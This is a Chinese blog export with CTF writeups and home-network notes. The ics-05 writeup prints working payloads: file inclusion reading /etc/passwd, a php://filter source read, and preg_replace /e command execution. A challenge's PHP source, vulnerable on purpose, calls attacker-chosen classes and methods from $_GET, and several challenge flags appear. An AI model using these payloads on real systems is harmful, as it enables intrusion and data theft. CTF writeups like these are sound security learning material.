class="comment">ReflectionMethod::isDestructor — 判断方法是否是析构方法</span></span><br><span class="line"><span class="comment">ReflectionMethod::isFinal — 判断方法是否定义 final</span></span><br><span class="line"><span class="comment">ReflectionMethod::isPrivate — 判断方法是否是私有方法</span></span><br><span class="line"><span class="comment">ReflectionMethod::isProtected — 判断方法是否是保护方法 (protected)</span></span><br><span class="line"><span class="comment">ReflectionMethod::isPublic — 判断方法是否是公开方法</span></span><br><span class="line"><span class="comment">ReflectionMethod::isStatic — 判断方法是否是静态方法</span></span><br><span class="line"><span class="comment">ReflectionMethod::setAccessible — 设置方法是否访问</span></span><br><span class="line"><span class="comment">ReflectionMethod::__toString — 返回反射方法对象的字符串表达</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">ReflectionMethod <span class="keyword">extends</span> ReflectionFunctionAbstract <span class="keyword">implements</span> Reflector &#123;</span><br><span class="line"><span class="comment">/* 常量 */</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">integer</span> IS_STATIC = <span class="number">1</span> ;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">integer</span> IS_PUBLIC = <span class="number">256</span> ;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">integer</span> IS_PROTECTED = <span class="number">512</span> ;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">integer</span> IS_PRIVATE = <span class="number">1024</span> ;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">integer</span> IS_ABSTRACT = <span class="number">2</span> ;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">integer</span> IS_FINAL = <span class="number">4</span> ;</span><br><span class="line"><span class="comment">/* 属性 */</span></span><br><span class="line"><span class="keyword">public</span> <span class="variable">$name</span> ;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$class</span> ;</span><br><span class="line"><span class="comment">/* 方法 */</span></span><br><span class="line"><span class="keyword">public</span> __construct ( <span class="keyword">mixed</span> <span class="variable">$class</span> , <span class="keyword">string</span> <span class="variable">$name</span> )</span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> export ( <span class="keyword">string</span> <span class="variable">$class</span> , <span class="keyword">string</span> <span class="variable">$name</span> [, <span class="keyword">bool</span> <span class="variable">$return</span> = <span class="literal">false</span> ] ) : <span class="keyword">string</span></span><br><span class="line"><span class="keyword">public</span> getClosure ( <span class="keyword">object</span> <span class="variable">$object</span> ) : <span class="built_in">Closure</span></span><br><span class="line"><span class="keyword">public</span> getDeclaringClass ( ) : ReflectionClass</span><br><span class="line"><span class="keyword">public</span> getModifiers ( ) : <span class="keyword">int</span></span><br><span class="line"><span class="keyword">public</span> getPrototype ( ) : ReflectionMethod</span><br><span class="line"><span class="keyword">public</span> invoke ( <span class="keyword">object</span> <span class="variable">$object</span> [, <span class="keyword">mixed</span> <span class="variable">$parameter</span> [, <span class="keyword">mixed</span> $... ]] ) : <span class="keyword">mixed</span></span><br><span class="line"><span class="keyword">public</span> invokeArgs ( <span class="keyword">object</span> <span class="variable">$object</span> , <span class="keyword">array</span> <span class="variable">$args</span> ) : <span class="keyword">mixed</span></span><br><span class="line"><span class="keyword">public</span> isAbstract ( ) : <span class="keyword">bool</span></span><br><span class="line"><span class="keyword">public</span> isConstructor ( ) : <span class="keyword">bool</span></span><br><span class="line"><span class="keyword">public</span> isDestructor ( ) : <span class="keyword">bool</span></span><br><span class="line"><span class="keyword">public</span> isFinal ( ) : <span class="keyword">bool</span></span><br><span class="line"><span class="keyword">public</span> isPrivate ( ) : <span class="keyword">bool</span></span><br><span class="line"><span class="keyword">public</span> isProtected ( ) : <span class="keyword">bool</span></span><br><span class="line"><span class="keyword">public</span> isPublic ( ) : <span class="keyword">bool</span></span><br><span class="line"><span class="keyword">public</span> isStatic ( ) : <span class="keyword">bool</span></span><br><span class="line"><span class="keyword">public</span> setAccessible ( <span class="keyword">bool</span> <span class="variable">$accessible</span> ) : <span class="keyword">void</span></span><br><span class="line"><span class="keyword">public</span> __toString ( ) : <span class="keyword">string</span></span><br><span class="line"><span class="comment">/* 继承的方法 */</span></span><br><span class="line"><span class="keyword">final</span> <span class="keyword">private</span> ReflectionFunctionAbstract::__clone ( ) : <span class="keyword">void</span></span><br><span class="line"><span class="keyword">public</span> ReflectionFunctionAbstract::getClosureScopeClass ( ) : ReflectionClass</span><br><span class="line"><span class="keyword">public</span> ReflectionFunctionAbstract::getClosureThis ( ) : <span class="keyword">object</span></span><br><span class="line"><span class="keyword">public</span> ReflectionFunctionAbstract::getDocComment ( ) : <span class="keyword">string</span></span><br><span class="line"><span class="keyword">public</span> ReflectionFunctionAbstract::getEndLine ( ) : <span class="keyword">int</span></span><br><span class="line"><span class="keyword">public</span> ReflectionFunctionAbstract::getExtension ( ) : ReflectionExtension</span><br><span class="line"><span class="keyword">public</span> ReflectionFunctionAbstract::getExtensionName ( ) : <span class="keyword">string</span></span><br><span class="line"><span class="keyword">public</span> ReflectionFunctionAbstract::getFileName ( ) : <span class="keyword">string</span></span><br><span class="line"><span class="keyword">public</span> ReflectionFunctionAbstract::getName ( ) : <span class="keyword">string</span></span><br><span class="line"><span class="keyword">public</span> ReflectionFunctionAbstract::getNamespaceName ( ) : <span class="keyword">string</span></span><br><span class="line"><span class="keyword">public</span> ReflectionFunctionAbstract::getNumberOfParameters ( ) : <span class="keyword">int</span></span><br><span class="line"><span class="keyword">public</span> ReflectionFunctionAbstract::getNumberOfRequiredParameters ( ) : <span class="keyword">int</span></span><br><span class="line"><span class="keyword">public</span> ReflectionFunctionAbstract::getParameters ( ) : <span class="keyword">array</span></span><br><span class="line"><span class="keyword">public</span> ReflectionFunctionAbstract::getReturnType ( ) : ReflectionType</span><br><span class="line"><span class="keyword">public</span> ReflectionFunctionAbstract::getShortName ( ) : <span class="keyword">string</span></span><br><span class="line"><span class="keyword">public</span> ReflectionFunctionAbstract::getStartLine ( ) : <span class="keyword">int</span></span><br><span class="line"><span class="keyword">public</span> ReflectionFunctionAbstract::getStaticVariables ( ) : <span class="keyword">array</span></span><br><span class="line"><span class="keyword">public</span> ReflectionFunctionAbstract::hasReturnType ( ) : <span class="keyword">bool</span></span><br><span class="line"><span class="keyword">public</span> ReflectionFunctionAbstract::inNamespace ( ) : <span class="keyword">bool</span></span><br><span class="line"><span class="keyword">public</span> ReflectionFunctionAbstract::isClosure ( ) : <span class="keyword">bool</span></span><br><span class="line"><span class="keyword">public</span> ReflectionFunctionAbstract::isDeprecated ( ) : <span class="keyword">bool</span></span><br><span class="line"><span class="keyword">public</span> ReflectionFunctionAbstract::isGenerator ( ) : <span class="keyword">bool</span></span><br><span class="line"><span class="keyword">public</span> ReflectionFunctionAbstract::isInternal ( ) : <span class="keyword">bool</span></span><br><span class="line"><span class="keyword">public</span> ReflectionFunctionAbstract::isUserDefined ( ) : <span class="keyword">bool</span></span><br><span class="line"><span class="keyword">public</span> ReflectionFunctionAbstract::isVariadic ( ) : <span class="keyword">bool</span></span><br><span class="line"><span class="keyword">public</span> ReflectionFunctionAbstract::returnsReference ( ) : <span class="keyword">bool</span></span><br><span class="line"><span class="keyword">abstract</span> <span class="keyword">public</span> ReflectionFunctionAbstract::__toString ( ) : <span class="keyword">void</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="伪源码"><a href="#伪源码" class="headerlink" title="伪源码"></a>伪源码</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> <span class="variable">$c</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">b</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">c</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">d</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">e</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">g</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">h</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">i</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">j</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">k</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">l</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">m</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">n</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">o</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">p</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/** </span></span><br><span class="line"><span class="comment">    * Increment counter</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@final</span></span></span><br><span class="line"><span class="comment">    * <span class="doctag">@static</span></span></span><br><span class="line"><span class="comment">    * <span class="doctag">@access</span>  publicflag&#123;b5bd0ab820fd11eb8cf4fa163e83cb88&#125;</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@return</span>  int</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">q</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">r</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">s</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">t</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$rc</span>=<span class="variable">$_GET</span>[<span class="string">&quot;rc&quot;</span>];</span><br><span class="line"><span class="variable">$rb</span>=<span class="variable">$_GET</span>[<span class="string">&quot;rb&quot;</span>];</span><br><span class="line"><span class="variable">$ra</span>=<span class="variable">$_GET</span>[<span class="string">&quot;ra&quot;</span>];</span><br><span class="line"><span class="variable">$rd</span>=<span class="variable">$_GET</span>[<span class="string">&quot;rd&quot;</span>];</span><br><span class="line"><span class="variable">$method</span>= <span class="keyword">new</span> <span class="variable">$rc</span>(<span class="variable">$ra</span>, <span class="variable">$rb</span>);</span><br><span class="line">var_dump(<span class="variable">$method</span>-&gt;<span class="variable">$rd</span>());</span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>WEB</tag>
        <tag>CTF</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>give_you_flag-writeup</title>
    <url>/2020/11/17/give-you-flag-writeup/</url>
    <content><![CDATA[<h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><p>本题来源于攻防世界，MISC题，题目考察的是二维码修复能力。</p>
<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>题目是一张GIF图片，使用图像软件逐帧查看可发现里面有个二维码，我这里使用的是<code>ImageGlass</code>，免费软件。</p>
<a id="more"></a>
<p><img data-src="/2020/11/17/give-you-flag-writeup/image-20201117154637142.png"></p>
<p>使用<code>ImageGlass</code>提取所有帧：</p>
<p><img data-src="/2020/11/17/give-you-flag-writeup/image-20201117155032363.png"></p>
<p><img data-src="/2020/11/17/give-you-flag-writeup/image-20201117155126107.png"></p>
<p>打开图片，是个残缺的二维码：</p>
<p><img data-src="/2020/11/17/give-you-flag-writeup/image-20201117155305222.png"></p>
<p>看了其它wp说用ps来修复，无奈ps太菜了，这里另辟蹊径，讲讲我的方法。</p>
<p>首先随意取一张二维码图片，放大，使用<code>Snipaste</code>（一个截图软件，免费）按<code>F1</code>键把定位符截图，然后按<code>F3</code>键贴图，重复复制3个定位符</p>
<p><img data-src="/2020/11/17/give-you-flag-writeup/image-20201117155436560.png"></p>
<p>得到3个定位符，然后把定位符调整到合适大小，并移动到残缺的二维码中， 然后再截屏到识别软件提取或者手机扫码提取：</p>
<p><img data-src="/2020/11/17/give-you-flag-writeup/image-20201117155713817.png"></p>
<p><img data-src="/2020/11/17/give-you-flag-writeup/image-20201117155951545.png"></p>
<p>扫码后得到flag： <code>flag&#123;e7d478cf6b915f50ab1277f78502a2c5&#125;</code></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>攻防世界</tag>
        <tag>MISC</tag>
      </tags>
  </entry>
  <entry>
    <title>ics-05-writeup</title>
    <url>/2020/12/29/ics-05-writeup/</url>
    <content><![CDATA[<p><strong>本文仅作为技术讨论及分享，严禁用于任何非法用途。</strong></p>
<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>本题来源于XCTF 4th-CyberEarth，攻防世界WEB进阶021上是原题，题目名称为<code>ics-05</code>，题目信息如下。<br><img data-src="/2020/12/29/ics-05-writeup/2020-12-29-14-52-41.png"></p>
<a id="more"></a>
<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>打开题目链接，页面如下。<br><img data-src="/2020/12/29/ics-05-writeup/2020-12-29-15-07-00.png"><br>只有一个菜单功能可访问，也对应了题目描述“设备维护中心”的后门，所以从这开始下手，发现存在文件包含漏洞。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/index.php?page=/etc/passwd</span><br></pre></td></tr></table></figure>
<p><img data-src="/2020/12/29/ics-05-writeup/2020-12-29-15-06-26.png"></p>
<p>然后利用php 文件包含读取index.php源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/index.php/?page=php:<span class="comment">//filter/convert.base64-encode/resource=index.php</span></span><br></pre></td></tr></table></figure>
<p><img data-src="/2020/12/29/ics-05-writeup/2020-12-29-14-56-38.png"></p>
<p>在源码中发现后门<br><img data-src="/2020/12/29/ics-05-writeup/2020-12-29-14-58-16.png"></p>
<p>想起以前有个php webshell就用了preg_replace执行任意代码，参考一下，成功执行命令得到flag，原理是<code>preg_replace</code>函数执行一个正则表达式的搜索和替换，<code>preg_replce</code>正则表达式部分包含e参数的时候，进行替换的部分会被执行。然后ip要<code>127.0.0.1</code>，大家一看就知道用XFF头了，不多说，我这里这么多条是因为用了插件<code>fakeIp</code>自动生成。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/index.php?pat=/[checksql]/e&amp;rep=system(<span class="string">&#x27;cat+s3chahahaDir/flag/flag.php&#x27;</span>);&amp;sub=saft</span><br></pre></td></tr></table></figure>
<p><img data-src="/2020/12/29/ics-05-writeup/2020-12-29-15-00-06.png"></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>WEB</tag>
        <tag>CTF</tag>
        <tag>PHP</tag>
        <tag>攻防世界</tag>
        <tag>文件包含</tag>
      </tags>
  </entry>
  <entry>
    <title>kali iptables 配置自启动加载</title>
    <url>/2020/08/21/kali-iptables-%E9%85%8D%E7%BD%AE%E8%87%AA%E5%90%AF%E5%8A%A8%E5%8A%A0%E8%BD%BD/</url>
    <content><![CDATA[<h3 id="创建启动配置文件"><a href="#创建启动配置文件" class="headerlink" title="创建启动配置文件"></a>创建启动配置文件</h3><p>编辑创建以下文件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/network/if-pre-up.d/iptables</span><br></pre></td></tr></table></figure>
<p>粘贴下面内容：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#! /bin/sh</span></span><br><span class="line">/sbin/iptables-restore &lt; /etc/iptables/rules.v4</span><br></pre></td></tr></table></figure>
<p>添加执行权限：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">chmod +x /etc/network/if-pre-up.d/iptables</span><br></pre></td></tr></table></figure>
<p>通过下面命令保存iptables：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">iptables-save &gt; /etc/iptables/rules.v4</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>openwrt折腾笔记</title>
    <url>/2023/03/20/openwrt%E6%8A%98%E8%85%BE%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p><strong>本文仅作为技术讨论及分享，严禁用于任何非法用途。</strong></p>
<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>本文只是记录一下openwrt日常配置方法，作为备忘。</p>
<h3 id="openwrt重置"><a href="#openwrt重置" class="headerlink" title="openwrt重置"></a>openwrt重置</h3><p>在终端中执行下面命令，可讲openwrt恢复出厂设置，主要用于特殊原因访问不到web界面的时候。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">firstboot -y &amp;&amp; reboot</span><br></pre></td></tr></table></figure>

<h3 id="自动更新ipv6-pd前缀"><a href="#自动更新ipv6-pd前缀" class="headerlink" title="自动更新ipv6 pd前缀"></a>自动更新ipv6 pd前缀</h3><p>自动将从wan6获取到的ipv6 pd前缀更新到lan口，配置原因请看下文：<br><a href="https://r0yanx.com/2023/02/22/%E7%88%B1%E5%BF%AB%E4%B8%BB%E8%B7%AF%E7%94%B1%E4%B8%8BIPV6%E9%98%B2%E7%81%AB%E5%A2%99%E7%9A%84%E6%9C%80%E4%BC%98%E8%A7%A3/#more">爱快主路由下 IPV6 防火墙的最优解（可能）</a></p>
<p>调试过程：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 获取wan6的pd前缀</span></span><br><span class="line">newpd=`ubus call network.interface.wan6 status |jq <span class="string">&#x27;.[&quot;ipv6-prefix&quot;][0]&#x27;</span> | jq -r  <span class="string">&#x27;&quot;\(.address)\/\(.mask)&quot;&#x27;</span>`</span><br><span class="line"><span class="comment"># 获取lan口的ipv6地址</span></span><br><span class="line">lan_v6=`ubus call network.interface.lan status |jq <span class="string">&#x27;.[&quot;ipv6-address&quot;][0]&#x27;</span> | jq -r  <span class="string">&#x27;&quot;\(.address)\/\(.mask)&quot;&#x27;</span>`</span><br><span class="line"><span class="comment"># 或者</span></span><br><span class="line">newpd=`ifstatus wan6|jq <span class="string">&#x27;.[&quot;ipv6-prefix&quot;][0]&#x27;</span> | jq -r   <span class="string">&#x27;&quot;\(.address)\/\(.mask)&quot;&#x27;</span>`</span><br><span class="line">lan_v6=`ifstatus lan|jq <span class="string">&#x27;.[&quot;ipv6-address&quot;][0]&#x27;</span> | jq -r   <span class="string">&#x27;&quot;\(.address)\/\(.mask)&quot;&#x27;</span>`</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改lan口v6地址</span></span><br><span class="line">uci <span class="built_in">set</span> network.lan.ip6addr=<span class="string">&#x27;24xx:xxxx:xxx:xxxx::/64&#x27;</span></span><br><span class="line">uci commit network</span><br><span class="line">service network restart</span><br><span class="line"></span><br><span class="line"><span class="comment"># 判断wan6 pd前缀是否应用到lan口，否则就更新wan6地址到lan口</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$newpd</span>&quot;</span> != <span class="string">&quot;<span class="variable">$lan_v6</span>&quot;</span> ];<span class="keyword">then</span> uci <span class="built_in">set</span> network.lan.ip6addr=<span class="variable">$newpd</span>;uci commit network;service network restart;<span class="keyword">fi</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#完整cron</span></span><br><span class="line"></span><br><span class="line">* * * * * newpd=`ifstatus wan6|jq <span class="string">&#x27;.[&quot;ipv6-prefix&quot;][0]&#x27;</span> | jq -r   <span class="string">&#x27;&quot;\(.address)\/\(.mask)&quot;&#x27;</span>`;lan_v6=`ifstatus lan|jq <span class="string">&#x27;.[&quot;ipv6-address&quot;][0]&#x27;</span> | jq -r   <span class="string">&#x27;&quot;\(.address)\/\(.mask)&quot;&#x27;</span>`;<span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$newpd</span>&quot;</span> != <span class="string">&quot;<span class="variable">$lan_v6</span>&quot;</span> ];<span class="keyword">then</span> uci <span class="built_in">set</span> network.lan.ip6addr=<span class="variable">$newpd</span>;uci commit network;service network restart;<span class="keyword">fi</span></span><br></pre></td></tr></table></figure>

<p>相关参考：<br><a href="https://openwrt.org/zh/docs/guide-user/base-system/uci">https://openwrt.org/zh/docs/guide-user/base-system/uci</a></p>
<a id="more"></a>
<h3 id="Adguardhome与SSR共存"><a href="#Adguardhome与SSR共存" class="headerlink" title="Adguardhome与SSR共存"></a>Adguardhome与SSR共存</h3><p>adguardhome直接从源安装的不稳定，容易卡死，先下载luci包，然后通过页面上的更新功能来安装adguardhome核心</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">https://github.com/rufengsuixing/luci-app-adguardhome/releases/download/1.8-9/luci-app-adguardhome_1.8-9_all.ipk</span><br></pre></td></tr></table></figure>

<p>ssr作为fq网关时，dns解析依赖dnsmasq，所以dns解析必须经过dnsmasq(有特殊情况，就是ssr DNS解析方式选择”使用本机端口为5335的DNS服务”的时候，不需要，属于高级玩法啦，此处不讨论)。<br>为了让adguardhome显示内网ip而不是127.0.0.1，要把adguardhome监听53端口，然后上游设置为dnsmasq，dnsmasq上游设置为smartdns</p>
<p>client -&gt; adguardhome 53 -&gt; dnsmasq 53503 -&gt; smartdns 6053 -&gt; internet dns</p>
<p>以下引用恩山网友的测试记录：<br>dns重定向</p>
<ul>
<li>作为dnsmasq的上游服务器(在AGH中统计到的ip都为127.0.0.1，无法统计客户端及对应调整设置，乳酸菌饮料-plus正常)</li>
<li>重定向53端口到 AdGuardHome（ipv6需要开启ipv6 nat redirect 否则如果客户端使用ipv6过滤无效，不以dnsmasq为上游乳酸菌饮料-plus失效）</li>
<li>使用53端口替换 dnsmasq(需要设置AGH的dnsip为0.0.0.0, AGH和dnsmasq的端口将被交换，不以dnsmasq为上游乳酸菌饮料-plus失效)</li>
</ul>
<p>官方说法：<br><a href="https://github.com/rufengsuixing/luci-app-adguardhome">https://github.com/rufengsuixing/luci-app-adguardhome</a><br>关于ssr配合<br>方法一gfw代理：dns重定向-作为dnsmasq的上游服务器<br>方法二gfw代理：手动设置adh上游dns为自己即127.0.0.1:[自己监听的端口]，然后使用 dns重定向-使用53端口替换dnsmasq，（因为端口互换后就是dnsmasq为上游了）<br>方法三国外ip代理：任意重定向方式，adh加入gfw列表，开启计划任务定时更新gfw即可</p>
<h3 id="安装SmartDNS"><a href="#安装SmartDNS" class="headerlink" title="安装SmartDNS"></a>安装SmartDNS</h3><p>SmartDNS使用起来效果确实不错的，建议安装。<br>下载luci-app-smartdns，太新的貌似不兼容，下了个20年的可以</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">https://github.com/pymumu/smartdns/releases/download/Release33/luci-app-smartdns.1.2020.09.08-2235.all-luci-compat-all.ipk</span><br></pre></td></tr></table></figure>

<p>下载本体:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">https://github.com/pymumu/smartdns/releases/download/Release40/smartdns.1.2023.01.02-1537.x86_64-openwrt-all.ipk</span><br></pre></td></tr></table></figure>

<p>opkg install xxx 安装<br>然后重启openwrt，可看到菜单有smartdns</p>
<h3 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h3><p>光猫桥接配置、IPTV 单线复用、异地组网请看下文：<br><a href="https://r0yanx.com/2023/01/25/%E8%AE%B0%E5%AE%B6%E5%BA%AD%E7%BD%91%E7%BB%9C%E7%BB%84%E7%BD%91/">https://r0yanx.com/2023/01/25/%E8%AE%B0%E5%AE%B6%E5%BA%AD%E7%BD%91%E7%BB%9C%E7%BB%84%E7%BD%91/</a></p>
<h3 id="后续持续更新…"><a href="#后续持续更新…" class="headerlink" title="后续持续更新…"></a>后续持续更新…</h3>]]></content>
      <categories>
        <category>折腾</category>
      </categories>
      <tags>
        <tag>折腾</tag>
      </tags>
  </entry>
  <entry>
    <title>livere去除韩文广告</title>
    <url>/2022/09/16/livere%E5%8E%BB%E9%99%A4%E9%9F%A9%E6%96%87%E5%B9%BF%E5%91%8A/</url>
    <content><![CDATA[<p><strong>本文仅作为技术讨论及分享，严禁用于任何非法用途。</strong></p>
<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>今天打开博客发现评论下面居然有广告，经过简单排查发现广告来着评论插件livere，这里简单记录一下去广告的过程。</p>
<h3 id="去广告"><a href="#去广告" class="headerlink" title="去广告"></a>去广告</h3><p>广告是这样子的，在评论下方<br><img data-src="/2022/09/16/livere%E5%8E%BB%E9%99%A4%E9%9F%A9%E6%96%87%E5%B9%BF%E5%91%8A/2022-09-16-16-36-08.png"></p>
<a id="more"></a>
<p>简单搜索一下，找到解决方法，原理是屏蔽掉某个div<br><img data-src="/2022/09/16/livere%E5%8E%BB%E9%99%A4%E9%9F%A9%E6%96%87%E5%B9%BF%E5%91%8A/2022-09-16-16-37-28.png"></p>
